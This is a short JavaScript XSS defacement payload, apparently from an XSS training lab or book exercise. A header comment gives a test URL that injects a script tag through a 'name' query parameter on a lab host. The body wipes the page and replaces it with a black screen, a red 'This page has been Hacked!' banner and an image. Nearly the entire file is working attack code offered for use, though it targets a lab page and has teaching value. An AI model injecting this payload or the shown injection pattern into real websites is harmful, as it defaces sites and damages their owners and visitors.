// From XSS2007 page 186
// This js, when injected into user browser, will exhibit live "defacement" behavior.
// To test it, visit the following URL in your browser:
// http://10.22.3.84/html/xss/XSS2007/domxss-p83.html?name=Bob<script src=stallowned.js></script>

var title = "XSS Defacement";
var bgcolor = "#000000";
var image_url = document.currentScript.src.replace(/\/[^/]+$/, "/stallowned.jpg");
var text = "This page has been Hacked!";
var font_color = "#FF0000";

deface(title, bgcolor, image_url, text, font_color);

function deface(pageTitle, bgColor, imageUrl, pageText, fontColor) {
	
	console.log(">>>" + document.currentScript.src);
	
	document.title = pageTitle;
	document.body.innerHTML = '';
	document.bgColor = bgColor;

	var overLay = document.createElement("div");
	overLay.style.textAlign = 'center';
	document.body.appendChild(overLay);

	var txt = document.createElement("p");
	txt.style.font = 'normal normal bold 36px Verdana';
	txt.style.color = fontColor;
	txt.innerHTML = pageText;
	overLay.appendChild(txt);
	
	if (image_url != "") {
		var newImg = document.createElement("img");
		newImg.setAttribute("border", '0');
		newImg.setAttribute("src", imageUrl);
		overLay.appendChild(newImg);
	}
	
	var footer = document.createElement("p");
	footer.style.font = 'italic normal normal 12px Arial';
	footer.style.color = '#DDDDDD';
	footer.innerHTML = title;
	overLay.appendChild(footer);
}
